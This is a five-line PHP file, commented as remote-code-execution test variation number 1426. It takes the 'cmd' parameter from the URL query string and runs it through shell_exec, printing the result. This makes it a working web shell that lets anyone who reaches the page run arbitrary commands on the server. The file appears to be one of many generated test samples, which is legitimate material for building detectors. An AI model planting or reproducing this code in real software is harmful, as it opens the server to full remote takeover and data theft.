<?php
// RCE test variation #1426
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>